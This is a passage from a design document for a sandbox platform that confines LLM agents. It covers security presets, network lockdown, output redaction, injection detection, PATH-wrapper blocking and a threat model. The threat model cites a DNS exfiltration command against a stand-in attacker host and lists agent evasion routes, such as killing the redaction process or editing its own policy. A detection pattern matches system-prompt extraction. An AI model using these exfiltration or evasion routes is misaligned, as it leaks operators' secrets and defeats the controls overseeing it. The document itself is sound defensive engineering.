    Admission          *AdmissionConfig       `json:"admission,omitempty"`
    Audit              *AuditConfig           `json:"audit,omitempty"`
}

type NetworkConfigOverride struct {
    Enabled              *bool      `json:"enabled,omitempty"`
    DenyByDefault        *bool      `json:"denyByDefault,omitempty"`
    AdditionalDomains    []string   `json:"additionalDomains,omitempty"` // additive
    BlockKubeAPI         *bool      `json:"blockKubeAPI,omitempty"`
    AdditionalPorts      []PortRule `json:"additionalPorts,omitempty"`   // additive
}
```

### 6.4 New Endpoint: GET /api/v1/security/presets

Returns the available presets and their resolved configurations. Useful for UI rendering.

```json
GET /api/v1/security/presets

{
  "presets": {
    "standard": {
      "redaction": {"enabled": false},
      "network": {"enabled": false},
      "injectionDetection": {"enabled": false},
      "pathShadowing": {"enabled": false},
      "admission": {"enabled": false},
      "audit": {"enabled": false}
    },
    "hardened": {
      "redaction": {"enabled": true, "failMode": "closed"},
      "network": {"enabled": true, "denyByDefault": true, "blockKubeAPI": true, "allowDNS": true},
      "injectionDetection": {"enabled": true, "action": "log"},
      "pathShadowing": {"enabled": false},
      "admission": {"enabled": false},
      "audit": {"enabled": true, "logLevel": "standard"}
    },
    "paranoid": {
      "redaction": {"enabled": true, "failMode": "closed"},
      "network": {"enabled": true, "denyByDefault": true, "blockKubeAPI": true, "allowDNS": true},
      "injectionDetection": {"enabled": true, "action": "block"},
      "pathShadowing": {"enabled": true, "failMode": "closed", "blocking": {"enabled": true, "tier": 2}},
      "admission": {"enabled": true, "policies": ["read-only-root", "non-root", "no-secret-env-vars", "no-privilege-escalation", "resource-limits"]},
      "audit": {"enabled": true, "logLevel": "verbose", "syscallAudit": true}
    }
  },
  "clusterCapabilities": {
    "networkPolicyController": true,
    "kyvernoInstalled": false,
    "hardenedImageAvailable": true
  }
}
```

### 6.5 New Endpoint: GET /api/v1/workspaces/{id}/security-status

Returns the effective (resolved) security policy for a workspace, including inheritance chain:

```json
GET /api/v1/workspaces/ws-abc123/security-status

{
  "effectivePolicy": { ... resolved SecurityPolicy ... },
  "source": {
    "redaction": "workspace",
    "network": "profile:production-hardened",
    "injectionDetection": "workspace",
    "pathShadowing": "preset:hardened",
    "admission": "disabled (kyverno not installed)",
    "audit": "workspace"
  },
  "warnings": [
    "Kyverno not installed; admission enforcement unavailable",
    "PATH shadowing enabled but standard image in use; will use hardened image"
  ]
}
```

---

## 7. Controller Behavior

### 7.1 Policy Resolution

The controller resolves the effective security policy for each sandbox through this chain:

```
1. Start with preset defaults (if preset specified)
2. Apply SandboxProfile securityPolicy (if profileRef set)
3. Apply Workspace securityPolicy (overrides profile)
4. Apply Sandbox securityPolicyOverride (overrides workspace)
5. Validate resolved policy against cluster capabilities
6. Write resolved policy to /sandbox-cfg/security-policy.json
```

### 7.2 Pod Spec Generation

Based on the resolved policy, the controller modifies the pod spec:

| Feature | Pod spec change |
|---------|----------------|
| Redaction enabled | Create ConfigMap with policy JSON; add security-setup init container; proxy reads policy from CRD status |
| Network enabled | Create NetworkPolicy resource (owner-ref'd to Sandbox) |
| Injection detection | No pod spec change (runs in API proxy; reads policy from CRD status) |
| PATH shadowing enabled | Select hardened image (`Dockerfile.hardened`); add `mode-gate` init container |
| Admission enabled | Add label `llmsafespace.dev/admission-enforced: "true"` (Kyverno selector) |
| Audit enabled | Add annotation `llmsafespace.dev/audit-level: "{level}"` |

### 7.3 Init Container: security-setup

A new init container (runs after `credential-setup`) writes the resolved security policy:

```yaml
initContainers:
  - name: security-setup
    image: llmsafespace/base:latest
    command: ["sh", "-c"]
    args:
      - |
        cp /policy-source/security-policy.json /sandbox-cfg/security-policy.json
        chmod 444 /sandbox-cfg/security-policy.json
    volumeMounts:
      - name: sandbox-cfg
        mountPath: /sandbox-cfg
      - name: policy-config
        mountPath: /policy-source
        readOnly: true
volumes:
  - name: policy-config
    configMap:
      name: sandbox-{name}-security-policy  # Created by controller, owner-ref'd to Sandbox
```

The controller creates a ConfigMap containing the resolved JSON policy. The init container copies it to the shared emptyDir. This avoids shell string interpolation of JSON (which breaks on special characters in regex patterns).

The ConfigMap is owner-referenced to the Sandbox CRD and garbage-collected on deletion.

The file is read-only in the main container (shared emptyDir, written by init container). The agent cannot modify its own security policy.

### 7.4 Image Selection

| PATH shadowing | Image used |
|----------------|-----------|
| disabled | `llmsafespace/base:latest` (standard) |
| enabled | `llmsafespace/base-hardened:latest` (includes wrappers) |

The controller selects the image based on the resolved `pathShadowing.enabled` value. Both images share the same base — the hardened variant adds wrapper scripts and renames real binaries.

### 7.5 NetworkPolicy Lifecycle

When `network.enabled = true`:

1. **Create:** Controller creates a NetworkPolicy when sandbox enters `Creating` phase
2. **Update:** If workspace `securityPolicy.network.allowedDomains` changes, controller updates the NetworkPolicy
3. **Delete:** NetworkPolicy is owner-ref'd to Sandbox CRD → garbage collected on sandbox deletion

Domain resolution runs in a background goroutine (5-minute refresh). Stale IPs are kept until refresh succeeds (fail-open on DNS resolution failure to avoid breaking running sandboxes).

### 7.6 Condition Reporting

The controller reports security policy status via conditions and stores the resolved policy in CRD status for proxy consumption:

```yaml
status:
  # Machine-readable resolved policy — used by the API proxy for redaction and injection detection
  resolvedSecurityPolicy:
    redaction:
      enabled: true
      failMode: "closed"
      maxInputBytes: 1048576
      disableBuiltin: ["long-base64"]
      customPatterns:
        - pattern: "CORP-[A-Z0-9]{24}"
          replacement: "[REDACTED-CORP-KEY]"
          name: "corp-key"
    injectionDetection:
      enabled: true
      action: "log"
      customPatterns:
        - pattern: "(?i)run\\s+as\\s+root"
          name: "root-escalation"
          severity: "high"
    # Only redaction + injection fields needed by proxy; network/pathShadowing/admission are controller-only
  conditions:
    - type: SecurityPolicyApplied
      status: "True"
      reason: "PolicyResolved"
      message: "Effective policy: redaction=on, network=on, injection=on, pathShadow=off, admission=off, audit=on"
    - type: NetworkPolicyActive
      status: "True"
      reason: "NetworkPolicyCreated"
      message: "Egress restricted to 5 domains + LLM API allowlist"
    - type: AdmissionEnforcementUnavailable
      status: "True"
      reason: "KyvernoNotInstalled"
      message: "Kyverno CRD not found in cluster; admission enforcement disabled"
```

The `status.resolvedSecurityPolicy` field contains only the subset of the policy relevant to the API proxy (redaction config + injection detection config). The proxy already loads the Sandbox CRD via `sandboxOwnershipMiddleware` — it reads the resolved policy from this field. This avoids a second lookup and keeps the proxy stateless.

---

## 8. Runtime Image Changes

### 8.1 Standard Image (no change)

The standard base image (`runtimes/base/Dockerfile`) already includes:
- `/usr/local/bin/redact` binary
- `entrypoint-common.sh` and `entrypoint-opencode.sh`
- Security context (non-root, read-only root, dropped capabilities)

No changes needed for redaction-only mode. The entrypoint reads `security-policy.json` and conditionally pipes opencode stdout/stderr through `redact`.

### 8.2 Hardened Image (new)

```dockerfile
# runtimes/base/Dockerfile.hardened
FROM llmsafespace/base:latest

# Rename real binaries
RUN for bin in curl wget git; do \
      if [ -f "/usr/bin/$bin" ]; then \
        mv "/usr/bin/$bin" "/usr/bin/${bin}.real"; \
      fi; \
    done

# Install wrapper scripts
COPY --chmod=755 tools/wrappers/curl    /usr/local/bin/curl
COPY --chmod=755 tools/wrappers/wget    /usr/local/bin/wget
COPY --chmod=755 tools/wrappers/git     /usr/local/bin/git

# Install jq for policy file parsing in wrappers
RUN apt-get update && apt-get install -y --no-install-recommends jq \
    && rm -rf /var/lib/apt/lists/*
```

### 8.3 File Layout

```
runtimes/base/
├── Dockerfile              # Standard image
├── Dockerfile.hardened     # Hardened image (extends standard)
├── tools/
│   ├── entrypoints/
│   │   ├── entrypoint-common.sh    # Updated: reads security-policy.json
│   │   └── entrypoint-opencode.sh  # Updated: conditional redaction piping
│   └── wrappers/
│       ├── curl                     # NEW
│       ├── wget                     # NEW
│       └── git                      # NEW
└── security/
    ├── apparmor-profiles/
    └── seccomp-profiles/
```

---

## 9. Configuration Delivery

### 9.1 Security Policy File

The resolved security policy is delivered to the sandbox as a JSON file at `/sandbox-cfg/security-policy.json`:

```json
{
  "version": "1",
  "resolvedAt": "2026-05-24T10:00:00Z",
  "preset": "custom",
  "redaction": {
    "enabled": true,
    "failMode": "closed",
    "rules": [
      {"name": "url-credentials", "pattern": "...", "replacement": "..."},
      {"name": "corp-key", "pattern": "CORP-[A-Z0-9]{24}", "replacement": "[REDACTED-CORP-KEY]"}
    ],
    "maxInputBytes": 1048576
  },
  "network": {
    "enabled": true,
    "denyByDefault": true,
    "allowedDomains": ["pypi.org", "github.com", "api.openai.com"],
    "blockKubeAPI": true
  },
  "injectionDetection": {
    "enabled": true,
    "action": "log"
  },
  "pathShadowing": {
    "enabled": false
  },
  "audit": {
    "enabled": true,
    "logLevel": "standard"
  }
}
```

**File properties:**
- Written by `security-setup` init container
- Mounted read-only in main container (emptyDir shared volume)
- Permissions: `444` (world-readable, not writable)
- The agent cannot modify its own security policy

### 9.2 Entrypoint Integration

`entrypoint-common.sh` reads the policy file and configures the environment:

```bash
#!/bin/bash
POLICY_FILE="/sandbox-cfg/security-policy.json"

if [ -f "$POLICY_FILE" ]; then
    # Export for child processes
    export SECURITY_POLICY_FILE="$POLICY_FILE"

    # Redaction: check if enabled using grep (no jq dependency in standard image)
    if grep -q '"enabled":true' "$POLICY_FILE" 2>/dev/null && \
       grep -q '"redaction"' "$POLICY_FILE" 2>/dev/null; then
        export REDACT_ENABLED=true
        export REDACT_CONFIG="$POLICY_FILE"
    fi
fi
```

`entrypoint-opencode.sh` conditionally applies redaction:

```bash
#!/bin/bash
source /tools/entrypoints/entrypoint-common.sh

if [ "$REDACT_ENABLED" = "true" ] && [ -x /usr/local/bin/redact ]; then
    # Pipe opencode stdout/stderr through redact (secondary defense-in-depth)
    exec opencode serve --hostname 0.0.0.0 --port 4096 2>&1 | /usr/local/bin/redact
else
    exec opencode serve --hostname 0.0.0.0 --port 4096
fi
```

**Note:** The standard image does NOT require `jq`. The entrypoint uses simple `grep` for the boolean check. The hardened image installs `jq` for the wrapper scripts which need to parse blocking tiers and binary lists. This keeps the standard image minimal.

---

## 10. Presets and Defaults

### 10.1 Preset Resolution

When `preset` is specified (not `custom`), the controller expands it to the full policy before applying any per-feature overrides:

```go
func ResolvePreset(preset string) SecurityPolicy {
    switch preset {
    case "standard":
        return SecurityPolicy{} // All features disabled
    case "hardened":
        return SecurityPolicy{
            Redaction:          &RedactionConfig{Enabled: true, FailMode: "closed"},
            Network:            &NetworkConfig{Enabled: true, DenyByDefault: true, BlockKubeAPI: true, AllowDNS: true},
            InjectionDetection: &InjectionDetectConfig{Enabled: true, Action: "log"},
            Audit:              &AuditConfig{Enabled: true, LogLevel: "standard"},
        }
        // NOTE: hardened preset enables network with denyByDefault but no allowedDomains.
        // This requires platform LLM domains to be configured in Helm values
        // (security.llmApiDomains). If no LLM domains are configured, workspace
        // creation will fail validation per §11.2. This is intentional — the
        // operator must configure LLM domains before hardened/paranoid presets work.
    case "paranoid":
        return SecurityPolicy{
            Redaction:          &RedactionConfig{Enabled: true, FailMode: "closed"},
            Network:            &NetworkConfig{Enabled: true, DenyByDefault: true, BlockKubeAPI: true, AllowDNS: true},
            InjectionDetection: &InjectionDetectConfig{Enabled: true, Action: "block"},
            PathShadowing:      &PathShadowingConfig{Enabled: true, FailMode: "closed", Binaries: []string{"curl", "wget", "git"}, Blocking: &BlockingConfig{Enabled: true, Tier: 2}},
            Admission:          &AdmissionConfig{Enabled: true, Policies: []string{"read-only-root", "non-root", "no-secret-env-vars", "no-privilege-escalation", "resource-limits"}},
            Audit:              &AuditConfig{Enabled: true, LogLevel: "verbose", SyscallAudit: true},
        }
    }
}
```

### 10.2 Preset + Override Behavior

Users can start with a preset and override specific features:

```yaml
securityPolicy:
  preset: "hardened"
  # Override: disable network restriction (need open egress for this workspace)
  network:
    enabled: false
  # Override: enable injection blocking instead of just logging
  injectionDetection:
    action: "block"
```

Resolution: expand preset → apply overrides → validate → write to pod.

### 10.3 Platform Defaults (Helm)

Cluster operators can set platform-wide defaults via Helm values:

```yaml
# charts/llmsafespace/values.yaml
security:
  defaultPreset: "standard"  # Applied when workspace has no securityPolicy
  enforceMinimum:
    redaction: true           # Force redaction on ALL workspaces regardless of user config
    audit: true               # Force audit on ALL workspaces
  llmApiDomains:
    - "api.openai.com"
    - "api.anthropic.com"
  hardenedImageTag: "latest"
  admission:
    enabled: false            # Cluster-level Kyverno toggle
```

**`enforceMinimum`** allows operators to mandate certain features. Even if a user sets `redaction.enabled: false`, the controller overrides it to `true` if `enforceMinimum.redaction: true`. This is logged as a condition on the workspace.

---

## 11. Validation Rules

### 11.1 Mutual Exclusion

| Rule | Error |
|------|-------|
| `securityLevel` AND `securityPolicy` both set | "Cannot use both securityLevel (deprecated) and securityPolicy. Remove securityLevel." |

Presets + per-feature overrides are always valid. The preset provides the base; overrides customize it. For example, `preset: "hardened"` with `network.enabled: false` is a valid configuration that uses the hardened defaults but disables network restriction.

### 11.2 Dependency Validation

| Condition | Error |
|-----------|-------|
| `pathShadowing.enabled = true` AND hardened image not available | "PATH shadowing requires the hardened runtime image. Build and push llmsafespace/base-hardened or disable pathShadowing." |
| `network.enabled = true` AND no NetworkPolicy controller detected | "Network policy requires a NetworkPolicy controller (Calico, Cilium). Install one or disable network policy." |
| `network.enabled = true` AND `network.denyByDefault = true` AND `network.allowedDomains` is empty AND no platform LLM domains configured | "Deny-by-default network policy with no allowed domains would block all egress including LLM APIs. Add allowedDomains or configure platform LLM domains." |
| `admission.enabled = true` AND Kyverno not installed | Warning condition (not rejection): "Kyverno not installed; admission enforcement degraded." |

### 11.3 Pattern Validation

Custom regex patterns (redaction and injection) are compiled at validation time:

| Condition | Error |
|-----------|-------|
| Invalid regex in `customPatterns[].pattern` | "Invalid regex in customPatterns[{index}]: {compile error}" |
| Pattern name conflicts with built-in | "Pattern name '{name}' conflicts with built-in rule. Choose a different name." |
| Pattern name empty or > 64 chars | "Pattern name must be 1-64 characters" |
| Pattern exhibits catastrophic backtracking (ReDoS) | N/A — Go's RE2 engine is immune to ReDoS. This row retained for documentation: no runtime timeout needed. |
| Pattern exceeds AST complexity limit (>1000 nodes) | "Pattern in customPatterns[{index}] is too complex (1000 node limit). Simplify the pattern." |

**Pattern safety:** Go's `regexp` package uses RE2/Thompson NFA semantics — it guarantees linear-time matching and is immune to catastrophic backtracking by design. However, complex patterns still have high constant factors and can be slow on large inputs. Mitigations:

1. **Complexity limit at admission time:** Patterns with more than 1000 nodes in the parsed AST (via `regexp/syntax.Parse`) are rejected. This prevents patterns that are technically safe but pathologically slow.
2. **Input size limit:** The `maxInputBytes` field (default 1 MiB) prevents redaction from processing arbitrarily large inputs. Inputs exceeding this limit are passed through unredacted.
3. **Pattern count limit:** Maximum 20 custom patterns per workspace (prevents combinatorial slowdown from many patterns applied sequentially).

### 11.4 Webhook Validation

The validating webhook (`workspace_webhook.go`) performs all validation at admission time. Invalid configurations are rejected before the resource is persisted.

---

## 12. Migration and Backwards Compatibility

### 12.1 Deprecated Field Mapping

The existing `securityLevel` field maps to presets:

| `securityLevel` | Equivalent `securityPolicy` |
|-----------------|----------------------------|
| `"standard"` | `{preset: "standard"}` |
| `"high"` | `{preset: "paranoid"}` |
| `"custom"` | `{preset: "custom"}` (no features enabled by default) |

### 12.2 Migration Strategy

**Phase 1: Dual support (V2.1.0)**
- Both `securityLevel` and `securityPolicy` are accepted
- If only `securityLevel` is set, controller maps it to the equivalent preset
- If both are set, validation rejects the resource
- Deprecation warning logged when `securityLevel` is used

**Phase 2: Deprecation notice (V2.2.0)**
- `securityLevel` field marked deprecated in CRD description
- Webhook adds annotation `llmsafespace.dev/deprecated-field-used: securityLevel`
- Documentation updated to use `securityPolicy` exclusively

**Phase 3: Removal (V3.0.0)**
- `securityLevel` field removed from CRD schema
- Migration guide published

### 12.3 Zero-Downtime Upgrade

Existing workspaces with `securityLevel: "standard"` continue to work unchanged after upgrade. The controller treats missing `securityPolicy` as `{preset: "standard"}`. No migration of existing resources is required.

---

## 13. Observability

### 13.1 Metrics

| Metric | Type | Labels | Description |
|--------|------|--------|-------------|
| `llmsafespace_security_policy_active` | Gauge | `workspace_id`, `feature`, `enabled` | Which features are active per workspace |
| `llmsafespace_redaction_matches_total` | Counter | `rule_name`, `sandbox_id` | Redaction rule match count |
| `llmsafespace_redaction_errors_total` | Counter | `sandbox_id`, `error_type` | Redact binary failures |
| `llmsafespace_injection_detected_total` | Counter | `pattern_name`, `severity`, `action`, `sandbox_id` | Injection detection triggers |
| `llmsafespace_injection_blocked_total` | Counter | `sandbox_id` | Responses blocked by injection detection |
| `llmsafespace_network_policy_denied_total` | Counter | `sandbox_id`, `destination` | Egress attempts blocked (requires CNI metrics) |
| `llmsafespace_path_shadow_blocked_total` | Counter | `sandbox_id`, `binary`, `subcommand` | Commands blocked by PATH wrappers |
| `llmsafespace_security_policy_resolution_seconds` | Histogram | `preset` | Time to resolve effective policy |
| `llmsafespace_admission_rejection_total` | Counter | `policy`, `sandbox_id` | Kyverno rejections |

### 13.2 Dashboard

A Grafana dashboard (`charts/llmsafespace/dashboards/security.json`) provides:

- **Overview panel:** Feature enablement heatmap across all workspaces
- **Redaction panel:** Top triggered rules, false-positive candidates (rules with >100 matches/hour)
- **Injection panel:** Detection timeline, pattern distribution, blocked vs logged ratio
- **Network panel:** Denied egress attempts, domain resolution failures
- **Audit panel:** Event volume by type, unusual patterns

### 13.3 Alerting Rules

```yaml
# Prometheus alerting rules
groups:
  - name: llmsafespace-security
    rules:
      - alert: HighRedactionRate
        expr: rate(llmsafespace_redaction_matches_total[5m]) > 10
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "High redaction rate in sandbox {{ $labels.sandbox_id }}"
          description: "Possible credential leak attempt or misconfigured redaction rules"

      - alert: InjectionDetected
        expr: increase(llmsafespace_injection_detected_total{severity="critical"}[5m]) > 0
        labels:
          severity: critical
        annotations:
          summary: "Critical injection pattern detected in sandbox {{ $labels.sandbox_id }}"

      - alert: RedactBinaryFailure
        expr: increase(llmsafespace_redaction_errors_total[5m]) > 0
        labels:
          severity: warning
        annotations:
          summary: "Redact binary failure in sandbox {{ $labels.sandbox_id }}"
          description: "Security degraded — output may not be redacted"
```

---

## 14. Threat Model

### 14.1 Threats Addressed by Each Feature

| Threat | Feature | Mitigation |
|--------|---------|-----------|
| Agent accidentally logs credentials in output | Redaction (proxy layer) | Regex-based scrubbing of known secret patterns at the trust boundary |
| Agent exfiltrates data to attacker-controlled server | Network Policy | Deny-by-default egress; only allowlisted domains reachable |
| Attacker injects instructions via tool output | Injection Detection | Pattern matching on agent responses; block or flag |
| Agent reads secrets from environment/filesystem | PATH Shadowing | Wrapper scripts intercept tool output; redact before agent sees it |
| Controller bug generates insecure pod spec | Admission | Kyverno validates pod spec at admission; rejects non-compliant |
| Forensic investigation after incident | Audit | Comprehensive event log with timestamps and context |
| Agent modifies its own security policy | Config Delivery | Policy file written by init container via ConfigMap; read-only mount in main container |
| Agent disables redaction by killing the process | Redaction failMode | `failMode: closed` blocks all output if redact is unavailable |
| DNS-based data exfiltration | Audit (verbose) + Network Policy | Agent encodes secrets in DNS queries (e.g., `curl secret.attacker.com`). Mitigation: DNS query logging at verbose audit level; network policy limits which domains resolve; rate limiting at CoreDNS level (operator responsibility) |
| ReDoS via malicious custom patterns | Pattern Validation (§11.3) | Go RE2 guarantees linear-time matching; AST complexity limit (1000 nodes) rejects pathologically slow patterns; input size limit (1 MiB) bounds processing time; max 20 custom patterns per workspace |
| Credential leakage via allowed domains | Redaction (proxy layer) | Even when egress is allowed to a domain, the proxy redacts secrets from the response body before the client sees it. Does NOT prevent the agent from sending secrets TO the allowed domain (see §14.2). |

### 14.2 Threats NOT Addressed (Out of Scope)

| Threat | Why out of scope | Mitigation path |
|--------|-----------------|-----------------|
| Kernel exploit from within container | Requires VM-level isolation (Firecracker, gVisor) | gVisor runtime class (orthogonal to this design) |
| Side-channel attacks (Spectre, etc.) | Requires hardware-level mitigation | CPU pinning + dedicated nodes |
| Supply chain compromise of base image | Requires image signing and verification | Sigstore/cosign (separate initiative) |
| Compromised LLM provider | Agent sends data to LLM API which is always allowed | Out of scope — LLM provider trust is a business decision |
| Denial of service via resource exhaustion | Handled by existing resource limits | Orthogonal to security policy |
| Agent sends secrets TO an allowed domain | Network policy allows the connection; redaction only scrubs responses, not requests | Operator must minimize allowedDomains; PATH shadowing can block specific commands but cannot inspect request bodies. Accept as residual risk. |
| DNS tunneling (encoding data in query names) | DNS is allowed in all modes for resolution | Rate-limit DNS at CoreDNS level; verbose audit logs DNS queries for forensic analysis. Full mitigation requires DNS proxy (out of scope). |

### 14.3 Attack Surface by Preset

| Preset | Attack surface | Residual risk |
|--------|---------------|---------------|
| `standard` | Full — agent has open egress, no output filtering | Credential leaks, data exfiltration, injection propagation |
| `hardened` | Reduced — egress restricted, output filtered, injections logged | Sophisticated exfiltration via allowed domains, novel injection patterns, DNS tunneling |
| `paranoid` | Minimal — all output filtered, egress locked, commands blocked | Zero-day regex bypass, DNS tunneling, timing side-channels, exfiltration via LLM API (always allowed) |

---

## 15. Implementation Roadmap

### Phase 1: Core Infrastructure (Week 1-2)

| Task | Files | Priority |
|------|-------|----------|
| Define Go types for SecurityPolicy | `pkg/types/types.go` | Critical |
| Add securityPolicy to Workspace CRD schema | `pkg/crds/workspace_crd.yaml` | Critical |
| Add securityPolicyOverride to Sandbox CRD schema | `pkg/crds/sandbox_crd.yaml` | Critical |
| Implement preset resolution logic | `controller/internal/security/policy.go` | Critical |
| Add security-setup init container to pod spec | `controller/internal/sandbox/controller.go` | Critical |
| Update entrypoint scripts to read policy file | `runtimes/base/tools/entrypoints/` | Critical |
| Webhook validation for securityPolicy | `controller/internal/webhooks/` | High |
| Deprecation mapping for securityLevel | `controller/internal/security/migration.go` | High |

### Phase 2: Redaction + Injection Detection (Week 2-3)

| Task | Files | Priority |
|------|-------|----------|
| Implement proxy-layer redaction (primary enforcement) | `api/internal/handlers/proxy.go`, `api/internal/handlers/redaction.go` | Critical |
| Update entrypoint to conditionally pipe through redact (secondary) | `runtimes/base/tools/entrypoints/entrypoint-opencode.sh` | High |
| Implement injection detection in proxy handler | `api/internal/handlers/proxy.go` | Critical |
| Add configurable action (log/block/flag) | `api/internal/handlers/injection.go` | High |
| Custom pattern support for redaction | `pkg/redact/redact.go` | High |
| Custom pattern support for injection | `api/internal/handlers/injection.go` | High |
| Metrics for redaction and injection | `api/internal/services/metrics/` | Medium |
| Tests: proxy-layer redaction | `api/internal/handlers/redaction_test.go` | Critical |
| Tests: injection detection | `api/internal/handlers/injection_test.go` | Critical |

### Phase 3: Network Policy (Week 3-4)

| Task | Files | Priority |
|------|-------|----------|
| NetworkPolicy generation from security config | `controller/internal/common/network_policy_manager.go` | Critical |
| Domain resolution goroutine (5-min refresh) | `controller/internal/security/dns_resolver.go` | High |
| Cilium CiliumNetworkPolicy support (FQDN) | `controller/internal/security/cilium.go` | Medium |
| NetworkPolicy controller detection | `controller/internal/security/capabilities.go` | High |
| Owner-reference lifecycle management | `controller/internal/sandbox/controller.go` | Critical |
| Tests: NetworkPolicy generation | `controller/internal/security/network_test.go` | Critical |

### Phase 4: PATH Shadowing + Hardened Image (Week 4-5)

| Task | Files | Priority |
|------|-------|----------|
| Create wrapper scripts (curl, wget, git) | `runtimes/base/tools/wrappers/` | Critical |
| Create Dockerfile.hardened | `runtimes/base/Dockerfile.hardened` | Critical |
| Image selection logic in controller | `controller/internal/sandbox/controller.go` | Critical |
| Command blocking (tier 1 + tier 2) | `runtimes/base/tools/wrappers/` | High |
| CI: build hardened image | `.github/workflows/build-runtimes.yml` | High |
| Tests: wrapper behavior | `runtimes/tests/` | Critical |

### Phase 5: Admission + Audit + Polish (Week 5-6)

| Task | Files | Priority |
|------|-------|----------|
| Kyverno policy templates | `charts/llmsafespace/templates/kyverno/` | High |
| Kyverno detection logic | `controller/internal/security/capabilities.go` | High |
| Audit logging implementation | `api/internal/middleware/audit.go` | High |
| GET /security/presets endpoint | `api/internal/handlers/security.go` | Medium |
| GET /workspaces/{id}/security-status endpoint | `api/internal/handlers/workspace.go` | Medium |
| Grafana dashboard | `charts/llmsafespace/dashboards/security.json` | Medium |
| Alerting rules | `charts/llmsafespace/templates/prometheus-rules.yaml` | Medium |
| Platform enforceMinimum logic | `controller/internal/security/policy.go` | Medium |
| Documentation | `design/SECURITY-POLICY-V21.md` (this doc) | High |

---

## 16. User Stories

### US-SEC-1: Redaction Only

> As a developer running internal agents, I want to enable secret redaction without any other restrictions, so that accidental credential leaks in agent output are caught without breaking my workflow.

```yaml
securityPolicy:
  preset: "custom"
  redaction:
    enabled: true
    disableBuiltin: ["long-base64"]  # Too many false positives for my use case
```

### US-SEC-2: Network Lockdown for Multi-Tenant

> As a platform operator running a multi-tenant LLMSafeSpace deployment, I want to restrict agent egress to only LLM APIs and approved package registries, so that compromised agents cannot exfiltrate data.

```yaml
securityPolicy:
  preset: "custom"
  network:
    enabled: true
    denyByDefault: true
    allowedDomains:
      - "pypi.org"
      - "files.pythonhosted.org"
      - "registry.npmjs.org"
  redaction:
    enabled: true
  audit:
    enabled: true
```

### US-SEC-3: Compliance-Sensitive Environment

> As a security team managing SOC2-compliant infrastructure, I want maximum hardening with full audit trails, so that we can demonstrate security controls to auditors.

```yaml
securityPolicy:
  preset: "paranoid"
```

### US-SEC-4: Research Agent with Visibility

> As a researcher running agents that process untrusted user input, I want injection detection in log mode so I can study attack patterns without blocking legitimate responses.

```yaml
securityPolicy:
  preset: "custom"
  injectionDetection:
    enabled: true
    action: "log"
    customPatterns:
      - pattern: "(?i)reveal.*system.*prompt"
        name: "prompt-extraction"
        severity: "high"
  audit:
    enabled: true
    logLevel: "verbose"
```

### US-SEC-5: Gradual Hardening Rollout

> As a team lead, I want to start with redaction, validate it doesn't break our workflows, then add network restrictions next sprint, so that we can adopt security incrementally.

**Sprint 1:**
```yaml
securityPolicy:
  preset: "custom"
  redaction:
    enabled: true
```

**Sprint 2:**
```yaml
securityPolicy:
  preset: "custom"
  redaction:
    enabled: true
  network:
    enabled: true
    denyByDefault: true
    allowedDomains: ["pypi.org", "github.com"]
```

**Sprint 3:**
```yaml
securityPolicy:
  preset: "hardened"
```

### US-SEC-6: Per-Sandbox Override

> As a developer with a hardened workspace, I need one sandbox with open egress for testing external API integrations, without changing the workspace-wide policy.

```yaml
# Workspace: preset: "hardened" (network locked down)
# Sandbox override:
securityPolicyOverride:
  network:
    enabled: false  # This sandbox gets open egress
```

### US-SEC-7: Platform-Enforced Minimum

> As a cluster operator, I want to force redaction and audit on ALL workspaces regardless of user configuration, so that we always have a security baseline.

```yaml
# Helm values
security:
  enforceMinimum:
    redaction: true
    audit: true
```

Users who set `redaction.enabled: false` will see it overridden to `true` with a condition explaining why.

---

## Appendix A: Consistency with Existing Code

This section documents how the design integrates with the existing codebase.

### A.1 Type Ownership

Per README-LLM.md, CRD types and API transfer objects are intentionally separate:

| Location | Purpose | SecurityPolicy type needed |
|----------|---------|---------------------------|
| `pkg/apis/llmsafespace/v1/` | CRD types (kubebuilder-annotated, deepcopy generated) | `SecurityPolicySpec` — embedded in `SandboxSpec` and `WorkspaceSpec` |
| `pkg/types/types.go` | API DTOs (REST request/response shapes) | `SecurityPolicy` — used in `CreateWorkspaceRequest`, `CreateSandboxRequest` |

The API service converts between these at the service boundary (existing pattern: `convertCRDToAPI()` in `api/internal/services/sandbox/sandbox_service.go`).

### A.2 Existing Field Overlap

| Existing field | Location | Overlap with | Migration |
|---------------|----------|-------------|-----------|
| `SandboxSpec.SecurityLevel` | `sandbox_types.go:15` | `securityPolicy.preset` | Deprecated; maps to preset (§12.1) |
| `WorkspaceSpec.SecurityLevel` | `workspace_types.go:82` | `securityPolicy.preset` | Deprecated; maps to preset (§12.1) |
| `SandboxProfileSpec.SecurityLevel` | `sandboxprofile_types.go:15` | `securityPolicy.preset` | Deprecated; maps to preset (§12.1) |
| `SandboxSpec.NetworkAccess` | `sandbox_types.go:28` | `securityPolicy.network` | Deprecated; domain+ports map to `allowedDomains` + `allowedPorts` (§6.2) |
| `WorkspaceSpec.NetworkAccess` | `workspace_types.go:87` | `securityPolicy.network` | Deprecated; domain list maps to `allowedDomains` (no ports on workspace egress rules) |
| `SandboxProfileSpec.NetworkPolicies` | `sandboxprofile_types.go:20` | `securityPolicy.network` | Deprecated; egress rules map to `allowedDomains`; CIDR rules not supported in V2.1 (log warning, ignore) |

**Key constraint:** The existing `WorkspaceEgressRule` has domain-only (no ports), while `EgressRule` on Sandbox has domain + ports. The new `NetworkConfig.allowedPorts` is top-level (applies to all domains). Per-domain port rules are not supported in V2.1 — if the deprecated `NetworkAccess` has per-domain ports, they are flattened to the union of all ports in `allowedPorts`.

### A.3 Status Field Addition

`resolvedSecurityPolicy` is NEW on `SandboxStatus`. Implementation requires:

1. Add `ResolvedSecurityPolicy *ResolvedSecurityPolicy` to `SandboxStatus` in `pkg/apis/llmsafespace/v1/sandbox_types.go`
2. Add corresponding OpenAPI schema to `pkg/crds/sandbox_crd.yaml`
3. Regenerate deepcopy: `make deepcopy`
4. Controller writes this field during reconciliation (after policy resolution)
5. Proxy reads it from the cached Sandbox CRD (already loaded by `sandboxOwnershipMiddleware`)

### A.4 Controller Integration Points

The existing controller (`controller/internal/sandbox/controller.go`) currently:
- Does NOT act on `SecurityLevel` (confirmed: no conditional logic on the field)
- Already has `buildCredentialSetupInit()` that writes to `/sandbox-cfg/` via shared emptyDir
- Already has `buildPodSecurityContext()` for pod-level security settings

The new `security-setup` init container follows the same pattern as `credential-setup`:
- Same shared emptyDir volume (`sandbox-cfg`)
- Same image reference pattern
- Runs AFTER `credential-setup` (order matters: credentials first, then policy)

### A.5 Proxy Integration Points

The existing proxy (`api/internal/handlers/proxy.go`) currently:
